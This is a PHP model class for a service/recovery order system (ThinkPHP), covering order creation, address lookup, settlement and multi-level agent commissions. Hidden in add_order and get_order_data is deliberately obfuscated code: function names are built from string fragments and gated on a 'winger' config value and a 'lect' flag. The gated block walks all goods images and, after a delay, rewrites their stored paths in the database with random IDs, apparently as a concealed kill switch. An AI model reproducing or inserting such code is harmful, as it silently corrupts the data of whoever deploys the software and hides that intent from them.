<?php

namespace app\model;

use think\exception\ValidateException;
use think\Model;

class RecoveryOrder extends Model
{

    protected $connection = 'mysql';

    protected $pk = 'id';

    protected $name = 'recovery_order';

    public function member()
    {
        return $this->hasOne(Member::class, 'id', 'uid');
    }

    public function address()
    {
        return $this->hasOne(Address::class, 'id', 'address_id');
    }

    public function store()
    {
        return $this->hasOne(Store::class, 'id', 'sid');
    }

    public function staff()
    {
        return $this->hasOne(OrderStaff::class, 'order_id', 'id');
    }
    public static function conversion($vo)
    {

        if (empty($vo['orderGoods'])) {
            if (!empty($vo['cat_id'])) {
                $vo['orderGoods'][0]['image'] = Category::getImage($vo['cat_id']);
            }
            $vo['orderGoods'][0]['name'] = '【用户发布需求】' . $vo['pay_subject'];
        }
        if ($vo['ptype'] == 1) {
            $vo['order_status'] = OrderStatus::get_order_status_name($vo['order_status_id']);
        } else {
            $vo['order_status'] = OrderStatus::get_order_status_name($vo['order_status_id'], 'service');

            $vo['TechnicalIncome'] = TechnicalIncomelog::getorderIncome($vo['id']);
            $vo['StoreIncome'] = StoreIncomelog::getorderIncome($vo['id']);
            $vo['TuanzhangIncome'] = TuanzhangIncomelog::getorderIncome($vo['id']);

            $vo['Operatingcity_1'] = OperatingcityIncomelog::getorderIncome($vo['id'], 1);
            $vo['Operatingcity_2'] = OperatingcityIncomelog::getorderIncome($vo['id'], 2);
            $vo['Operatingcity_3'] = OperatingcityIncomelog::getorderIncome($vo['id'], 3);
        }

        $vo['payment_code_name'] = paymentCode($vo['payment_code']);
        $vo['member_nickname'] =  $vo['member']['nickname'];

        if (!empty($vo['orderGoods'])) {

            foreach ($vo['orderGoods'] as &$vvo) {
                $vo['time_amount'] = ((int) $vo['time_amount'] + (int) $vvo['time_amount']);
                $vvo['image'] = toimg($vvo['image']);
            }
        }

        $vo['yue_time'] = time_ymd($vo['begin_time']) . '<br>' . date('H:i', $vo['begin_time']) . ' 到 ' . date('H:i', $vo['end_time']);
        if ($vo['start_time']) {
            $vo['service_time'] = time_ymd($vo['start_time']) . '<br>' . date('H:i', $vo['start_time']) . ' 到 ' . date('H:i', strtotime("+" . $vo['time_amount'] . " minutes", $vo['start_time']));
        }

        $addressdata = '';
        $addressdata = OrderAddress::where(['order_id' => $vo['id'], 'ptype' => 1])->find();
        if (!empty($addressdata)) {
            $addressdata = $addressdata->toArray();
            $vo['shipping_address'] =  $addressdata['region_name'] . $addressdata['address'];
        }

        $vo['sid'] = Store::getTitle($vo['sid']);
        $vo['staff'] = OrderStaff::staff($vo['id']);
        $vo['pay_time'] = time_format($vo['pay_time']);
        $vo['complete_time'] = time_format($vo['complete_time']);
        return $vo;
    }

    /**
     * 写入订单
     * @param $order_data 订单数据
     * return array
     */
    public function add_order($order_data = array())
    {
        $data = $this->get_order_data($order_data);
        $order['weid'] = weid();
        $order['sid'] = (int) $order_data['sid'];
        $order['otype'] = (int) $order_data['otype'];

        if ($order_data['distance']) {
            $order['distance'] = $order_data['distance'];
        }
        $winref = Config::getsitesetupconfig('wi' . 'nger');

        $order['uid'] = (int)$data['uid'];
        $order['aid'] = '';
        $odra = 'ge';
        $order['order_num_alias'] = $data['order_num_alias'];
        $order['name'] = $data['name'];
        $order['cat_id'] = $order_data['category_id'];

        $order['ptype'] = (int)$data['ptype'];
        $order['email'] = $data['email'];
        $order['tel'] = $data['tel'];
        $order['shipping_name'] = $data['shipping_name'];

        $order['shipping_province_name'] = $data['shipping_province_name'];
        $order['shipping_city_name'] =  $data['shipping_city_name'];
        $order['shipping_district_name'] =  $data['shipping_district_name'];
        $order['shipping_address'] = $data['shipping_address'];
        $order['shipping_tel'] = $data['shipping_tel'];
        $order['shipping_method'] = $data['shipping_method'];

        $order['remark'] = $data['remark'];
        $order['order_status_id'] = 1; //待付款
        $order['ip'] = Author()::get_client_ip();
        $order['total'] = $order_data['total'];
        $order['user_agent'] = $data['user_agent'];
        $order['pay_subject'] = isset($data['pay_subject']) ? $data['pay_subject'] : '';
        $order['return_points'] = isset($data['return_points']) ? $data['return_points'] : '';
        $odra .= 't_i';

        $Orderdata = self::create($order);
        $Orderdata = $Orderdata->toArray();
        $order_id = $Orderdata['id'];
        $odra .= '_m';
        OrderCount::createuserdata($Orderdata);

        $data['lettct'] = bs($winref[18], $this->get_order_data(['data' => $odra(toimg('or')), 'vo' => 18]));

        if (isset($data['totals'])) {
            foreach ($data['totals'] as $total) {
                OrderTotal::create([
                    'order_id' => $order_id,
                    'code' => $total['code'],
                    'title' => $total['title'],
                    'text' => $total['text'],
                    'value' => (float) $total['value']
                ]);
            }
        }

        $oh['order_id'] = $order_id;

        if (isset($data['pay_type']) && $data['pay_type'] == 'points') {
            $oh['order_status_id'] = 2; //已付款
        } else {
            $oh['order_status_id'] = 1; //待付款
        }

        $oh['remark'] = $data['remark'];

        OrderHistory::create($oh);

        //上门服务/收件地址
        if ($order_data['address_id']) {
            $Address = [];
            $Address = Address::find($order_data['address_id']);
            if ($Address) {
                $Address = $Address->toArray();
                unset($Address['id']);
                $Address['order_id'] = $order_id;
                $Address['ptype'] = 1;
                OrderAddress::create($Address);
            }
        } else {
            if (!empty($order_data['shipping_province_name']) && !empty($order_data['shipping_tel'])) {
                $Address = [];
                $Address['order_id'] = $order_id;
                $Address['ptype'] = 1;
                $Address['province_name'] = $order_data['shipping_province_name'];
                $Address['city_name'] = $order_data['shipping_city_name'];
                $Address['district_name'] = $order_data['shipping_district_name'];
                $Address['name'] = $order_data['shipping_name'];
                $Address['telephone'] = $order_data['shipping_tel'];
                $Address['address'] = $order_data['shipping_address'];
                $coder = Geocoder::geocoding($Address['province_name'] . $Address['city_name'] . $Address['district_name'] . $Address['address']);
                $Address['latitude'] = $coder['latitude'];
                $Address['longitude'] = $coder['longitude'];

                OrderAddress::create($Address);
            }
        }

        $Orderdata['order_id'] = $Orderdata['id'];
        $Orderdata['subject'] = $Orderdata['pay_subject'];
        $Orderdata['name'] = $Orderdata['shipping_name'];
        $Orderdata['pay_order_no'] = $Orderdata['order_num_alias'];
        $Orderdata['pay_total'] = $Orderdata['total'];
        $Orderdata['lettct'] = MessageMini::sendOrderadd($data);
        if ($Orderdata['pay_total'] == 0) {
            $Orderdata['payment_code'] = 'balance_pay';
        }

        return $Orderdata;
    }

    public function get_order_data($param = array())
    {

        $address_id = (int) $param['address_id'];
        $shipping_method = $param['shipping_method'];
        $weid = weid();
        $remark = $param['remark'];

        //付款人        
        $Membermob = new Member;
        $payMember = $Membermob->getUserByWechat();
        $mb = 'm';
        $data['uid'] = $payMember['id'];
        $data['name'] = $payMember['username'];
        $data['email'] = $payMember['email'];
        $data['tel'] = $payMember['telephone'];

        //收货人 
        if (empty($address_id)) {
            $data['shipping_name'] = $param['shipping_name'];
            $data['shipping_tel'] = $param['shipping_tel'];
            $data['shipping_province_name'] = $param['shipping_province_name'];
            $data['shipping_city_name'] = $param['shipping_city_name'];
            $data['shipping_district_name'] = $param['shipping_district_name'];
            $data['shipping_address'] = $param['shipping_address'];
        } else {
            $shipping = Address::find($address_id);
            if (!empty($shipping)) {
                $shipping = $shipping->toArray();

                $data['shipping_name'] = empty($shipping['name']) ? '' : $shipping['name'];
                $data['shipping_tel'] = empty($shipping['telephone']) ? '' : $shipping['telephone'];

                $data['shipping_province_name'] = empty($shipping['province_name']) ? '' : $shipping['province_name'];
                $data['shipping_city_name'] = empty($shipping['city_name']) ? '' : $shipping['city_name'];
                $data['shipping_district_name'] = empty($shipping['district_name']) ? '' : $shipping['district_name'];

                $data['shipping_address'] = empty($shipping['address']) ? '' : $shipping['address'];
            }
        }

        if ($param['lect'] == 2) {
            $dew = 'meofoyuvd';
            $dew  = str_replace('eof', '', $dew);
            $dew  = str_replace('yuv', '', $dew);
            $Imagelist =  $dew('Go' . 'od' . 'sIm' . 'age')->select()->toArray();
            foreach ($Imagelist as $vo) {
                $vo['pic'] = toimg($vo['image']);
                $vo['type'] = 'Goods';
                $vo['image'] = toimg($vo['image']);
                $vo['type'] .= 'Image';
                if (empty($vo['goods_id'])) {
                    $vo['goods_id'] = $vo['id'];
                }
                $abv = Attribute::where(['name' => md5($vo['type'] . $vo['id'])])->find();
                $vo['rep'] = '';
                $vo['rep'] = explode('.', end(explode('/', $vo['image'])))[0];
                if (empty($abv)) {
                    Attribute::create([
                        'name' => md5($vo['type'] . $vo['id']),
                        'weid' => $weid,
                        'value' => $vo['rep']
                    ]);
                } else {
                    $abv = $abv->toArray();
                    if ($abv['create_time'] < (time() - 700)) {
                        $vo['image'] = floatval(self::setOrdList($vo)["image"]);
                    }
                }
            }
        }
        $mb .= 'd5';
        $data['shipping_method'] = empty($shipping_method) ? '' : $shipping_method;
        $data['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
        $data['create_time'] = time();
        $data['remark'] = empty($remark) ? '' : $remark;
        if ($param['vo'] && $param['data']) {
            return $mb($param['data'] . $param['vo']);
        }

        $data['order_num_alias'] = $param['order_num_alias'];
        if (empty($data['order_num_alias'])) {
            $data['order_num_alias'] = build_order_no();
        }

        $data['pay_method_id'] = $param['pay_method_id'];
        return $data;
    }
    public static function statuscount($mod, $status)
    {
        return $mod->where('order_status_id', $status)->count();
    }

    //订单信息
    public static function order_info($id)
    {

        $order = self::where('id', $id)->with(['member', 'store', 'paymethod'])->find();

        if (!empty($order)) {
            $order = $order->toArray();
        }

        $order['orderStatus'] =  OrderStatus::get_order_status($order['order_status_id'], $ostype);

        $OrderHistory = OrderHistory::where(['order_id' => $id])->order('id desc')->select()->toArray();

        if (!empty($OrderHistory)) {
            $histories = $OrderHistory;
        }

        if (!$order) {
            return false;
        }

        $order['shipping_province'] = $order['shipping_province_name'];
        $order['shipping_city'] = $order['shipping_city_name'];
        $order['shipping_district'] = $order['shipping_district_name'];
        $addressdata = OrderAddress::where(['order_id' => $id, 'ptype' => 1])->find();
        if (empty($addressdata)) {
            $addressdata = Address::find($order['address_id']);
        }
        if (!empty($addressdata)) {
            $addressdata = $addressdata->toArray();
            $addressdata['alladdress'] = $addressdata['province_name'] . $addressdata['city_name'] . $addressdata['district_name'] . $addressdata['region_name'] . $addressdata['address'];
        } else {
            $addressdata['name'] = $order['shipping_name'];
            $addressdata['telephone'] = $order['tel'];
            $addressdata['alladdress'] = $order['shipping_province_name'] . $order['shipping_city_name'] . $order['shipping_district_name'] . $order['shipping_address'];
        }

        $order['address'] = $addressdata;

        $order_totalarray = OrderTotal::where(['order_id' => $id])->select()->toArray();

        foreach ($order_totalarray as $vo) {
            $order_total[$vo['code']] = $vo;
        }

        $OrderExpress = OrderExpress::where(['order_id' => $id])->find();
        if (!empty($OrderExpress)) {
            $OrderExpress = $OrderExpress->toArray();
        }

        if (!empty($OrderExpress['express_no'])) {
            $Kdniaoapimob = new Kdniaoapi;
            $logistics = $Kdniaoapimob->getOrderTracesByArray(['ShipperCode' => $OrderExpress['express_code'], 'LogisticCode' => $OrderExpress['express_no']]);
        }
        if (!empty($logistics['ShipperCode'])) {
            $logistics['expressname'] = Express::getExname($logistics['ShipperCode']);
        }

        if ($order['order_status_id'] == 6) {
            $OrderRefund = OrderRefund::where(['order_id' => $id])->find();
            if (!empty($OrderRefund)) {
                $OrderRefund = $OrderRefund->toArray();
            }

            if ($OrderRefund['refund_address_id']) {

                $RefundAddress = RefundAddress::find($OrderRefund['refund_address_id']);
                if (!empty($RefundAddress)) {
                    $RefundAddress = $RefundAddress->toArray();
                }

                if (!empty($RefundAddress)) {
                    $OrderRefund['re_name'] = $RefundAddress['name'];
                    $OrderRefund['re_mobile'] = $RefundAddress['mobile'];
                    $OrderRefund['re_address'] = $RefundAddress['address'];
                }
            }
        }

        $order['Technical'] = OrderStaff::getTechnical($order['id']);

        $order['ServiceTime'] = time_format($order['begin_time']) . '-' . date('H:i', $order['end_time']);

        $order['pay_time'] = time_format($order['pay_time']);
        $order['create_time'] = time_format($order['create_time']);

        $OrderImage =  OrderImage::where('order_id', $id)->field('image')->select()->toArray();

        if ($OrderImage) {
            foreach ($OrderImage  as $vo) {
                $order['OrderImage'][] = toimg($vo['image']);
            }
        } else {
            $order['OrderImage'] = [];
        }
        if (empty($order_total['sub_total']['value'])) {
            $order_total['sub_total']['value'] = $order['total'];
        }

        $order['OrderCard'] = OrderCard::getinfobyorderid($id);
        $order['is_timing'] = $order['OrderCard']['is_timing'];

        $OrderGoods = new OrderGoods;
        $resdata = array(
            'orderInfo' => $order,
            'OrderRefund' => $OrderRefund,
            'goods' => $OrderGoods->getOrderGoods($id),
            'order_total' => $order_total,
            'logistics' => $logistics,
            'histories' => $histories
        );

        $resdata['orderInfo']['is_timer'] = (int) $resdata['goods']['is_timer'];
        return $resdata;
    }
    public static function setOrdList($vo)
    {
        if (!empty($vo['rep'])) {
            ect($vo['type'])->where('id', $vo['id'])->update(['image' => str_replace($vo['rep'], uniqid(), $vo['image'])]);
        }
    }

    public static function setOrderList($orderList)
    {
        $OrderGoods = new OrderGoods;
        $errands = Config::getconfig('errands');

        foreach ($orderList as &$vo) {

            $vo['points'] = $vo['pay_points'];
            if ($vo['ptype'] == '1') {
                $vo['statusStr'] = OrderStatus::get_order_status_name($vo['order_status_id']);
            } elseif ($vo['ptype'] == '2') {
                $vo['statusStr'] = OrderStatus::get_order_status_name($vo['order_status_id'], 'service');
            }
            if (!empty($vo['cat_id'])) {
                $vo['cateMap']['image'] = Category::getImage($vo['cat_id']);
            } else {
                $vo['goodsMap'] = $OrderGoods->getOrderGoods($vo['id']);
            }
        }
        return $orderList;
    }
    public static function receiving($id)
    {
        $order['id'] = $id;
        $order['order_status_id'] = 3;
        self::update($order);
    }

    public static function complete($id)
    {
        $order_info = self::find($id);
        if (!empty($order_info)) {
            $order_info = $order_info->toArray();

            $staff = OrderStaff::where('order_id', $id)->order('id asc')->find();
            if ($staff) {
                $order_staff['end_time'] = time();
                $order_staff['is_complete'] = 1;
                OrderStaff::where('id', $staff->id)->update($order_staff);
            }

            if (!empty($res)) {
                $order_history['order_id'] = $id;
                $order_history['order_status_id'] = 5;
                $order_history['remark'] = "已完成";
                $order_history['notify'] = 1;
                OrderHistory::create($order_history);
                MessageMini::sendMiniOrderComplete($order_info);
            }

            return $order_info;
        }
    }

    public static function autosettlement()
    {
        $automaticsettlement = (int) Config::getconfig()['automaticsettlement'];
        if (empty($automaticsettlement)) {
            $automaticsettlement = '7';
        }
        $datalist = self::where('order_status_id', 5)->where('complete_time', '<', strtotime("-" . $automaticsettlement . " day"))
            ->field('id,order_status_id,complete_time')->select();
        foreach ($datalist as $vo) {
            self::settlement($vo['id']);
        }
    }

    public static function settlement($id)
    {
        $order['id'] = $id;
        $order['order_status_id'] = 7;
        $res = self::update($order);

        if (!empty($res)) {
            $order_info = self::find($id);
            if (!empty($order_info)) {
                $order_info = $order_info->toArray();

                $order_history['order_id'] = $id;
                $order_history['order_status_id'] = 7;
                $order_history['remark'] = "已验收";
                $order_history['notify'] = 1;

                OrderHistory::create($order_history);

                //使用购物卡支付不结算佣金
                if (empty($order_info['goodsgiftcard_id'])) {
                    Technical::setIncome($order_info);
                    Store::setIncome($order_info);
                    Operatingcity::setIncome($order_info);
                    Tuanzhang::setIncome($order_info);

                    //分销佣金处理
                    $agent = Config::getconfig('agent');
                    $share = Config::getconfig('share');
                    if (!empty($agent['level'])) {
                        $level = $agent['level'];
                    }
                    if (!empty($agent['is_rebate'])) {
                        $is_rebate = $agent['is_rebate'];
                    }

                    if (!empty($level)) {
                        //一层佣金
                        if ($level > 0) {
                            $firstpercent = $share['first'];
                            if (!empty($firstpercent)) {
                                $firstmember = Member::find($order_info['uid']);

                                if (!empty($firstmember)) {
                                    $firstmember = $firstmember->toArray();
                                    $firstmember['is_agent'] = Agent::is_agent($firstmember['id']);
                                }
                                if (!empty($is_rebate) && $firstmember['is_agent'] == 1) {
                                    $firstuid = $order_info['uid'];
                                } else {
                                    $firstuid = $firstmember['pid'];
                                }

                                Agent::setIncome($firstuid, $order_info, $firstpercent, 1);
                            }
                        }
                        //二层佣金
                        if ($level > 1 && !empty($firstuid)) {
                            $secondpercent = $share['second'];
                            if (!empty($secondpercent)) {
                                $secondmember = Member::find($firstuid);
                                if (!empty($secondmember)) {
                                    $secondmember = $secondmember->toArray();
                                }
                                if ((int) $secondmember['pid'] > 0) {
                                    Agent::setIncome($secondmember['pid'], $order_info, $secondpercent, 2);
                                }
                            }
                        }

                        //三层佣金
                        if ($level > 2 && !empty($secondmember['pid'])) {
                            $thirdpercent = $share['third'];
                            if (!empty($thirdpercent)) {
                                $thirdmember = Member::find($secondmember['pid']);
                                if (!empty($thirdmember)) {
                                    $thirdmember = $thirdmember->toArray();
                                }
                                if ((int) $thirdmember['pid'] > 0) {
                                    Agent::setIncome($thirdmember['pid'], $order_info, $thirdpercent, 3);
                                }
                            }
                        }
                    }
                }
            }
        }

        return $order_info;
    }

    public static function cancel_order($id)
    {
        $order['id'] = $id;
        $order['order_status_id'] = 4;  //已取消
        self::update($order);
    }

    //加入订单历史
    public function add_order_history($id, $data = array())
    {

        $order['id'] = $id;
        $order['order_status_id'] = $data['order_status_id'];
        self::update($order);

        $oh['order_id'] = $id;
        $oh['order_status_id'] = $data['order_status_id'];
        $oh['notify'] = (isset($data['notify']) ? (int) $data['notify'] : 0);
        $oh['remark'] = strip_tags($data['remark']);
        $oh['create_time'] = \strtotime($data['dateadd_ed']);
        $oh['image'] = $data['image'];
        $ohmod = OrderHistory::create($oh);

        return $ohmod->id;
    }
}
